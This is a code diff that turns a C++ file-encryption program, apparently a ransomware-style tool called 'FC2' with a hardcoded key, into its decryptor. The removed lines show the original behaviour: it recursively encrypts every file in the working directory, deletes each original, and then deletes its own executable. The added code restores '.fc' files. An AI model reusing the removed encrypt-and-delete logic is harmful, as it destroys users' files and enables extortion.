@@ -4,11 +4,11 @@
 #include <vector>
 #include <dirent.h>
 #include <cstring>
-#include <unistd.h>
+#include <cstdio>
 
 const std::string key = "fastcryptor_for_the_win_haha";
 
-void encryptFile(const std::string& fileName)
+void decryptFile(const std::string& fileName)
 {
     std::ifstream inputFile(fileName, std::ios::binary);
     if (!inputFile.is_open()) {
@@ -16,11 +16,7 @@ void encryptFile(const std::string& fileName)
         return;
     }
 
-    if (fileName.find("FC2") != std::string::npos) {
-        return;
-    }
-
-    if (fileName.length() > 3 && fileName.substr(fileName.length() - 3) == ".fc") {
+    if (fileName.length() < 3 || fileName.substr(fileName.length() - 3) != ".fc") {
         return;
     }
 
@@ -37,38 +33,39 @@ void encryptFile(const std::string& fileName)
         processed++;
         int percentage = (processed * 100) / totalSize;
 
-        std::cout << "\rEncrypting " << fileName << " - " << percentage << "% complete";
+        std::cout << "\rDecrypting " << fileName << " - " << percentage << "% complete";
         std::cout.flush();
     }
     std::cout << std::endl;
 
-    std::string encryptedFileName = fileName + ".fc";
-    std::ofstream outputFile(encryptedFileName, std::ios::binary);
+    std::string decryptedFileName = fileName;
+    decryptedFileName.erase(decryptedFileName.length() - 3, 3);
+
+    std::ofstream outputFile(decryptedFileName, std::ios::binary);
     if (!outputFile.is_open()) {
-        std::cerr << "Error opening file: " << encryptedFileName << std::endl;
+        std::cerr << "Error opening file: " << decryptedFileName << std::endl;
         return;
     }
 
     outputFile.write(data.data(), data.size());
     outputFile.close();
 
-    if (unlink(fileName.c_str()) != 0) {
+    if (std::remove(fileName.c_str()) != 0) {
         std::cerr << "Error deleting file: " << fileName << std::endl;
     }
 }
 
-
-void encryptDirectory(const std::string& dirName)
+void decryptDirectory(const std::string& dirName)
 {
     DIR *dir;
     struct dirent *ent;
     if ((dir = opendir(dirName.c_str())) != NULL) {
         while ((ent = readdir(dir)) != NULL) {
             std::string fileName = dirName + "/" + ent->d_name;
-            if (ent->d_type == DT_REG) {
-                encryptFile(fileName);
+            if (ent->d_type == DT_REG && fileName.length() > 3 && fileName.substr(fileName.length() - 3) == ".fc") {
+                decryptFile(fileName);
             } else if (ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
-                encryptDirectory(fileName);
+                decryptDirectory(fileName);
             }
         }
         closedir(dir);
@@ -79,13 +76,7 @@ void encryptDirectory(const std::string& dirName)
 
 int main()
 {
-    encryptDirectory(".");
-
-    if (unlink("FC2") != 0) {
-        if (unlink("FC2.exe") != 0) {
-            std::cerr << "Error deleting file: FC3" << std::endl;
-        }
-    }
+    decryptDirectory(".");
 
     return 0;
 }
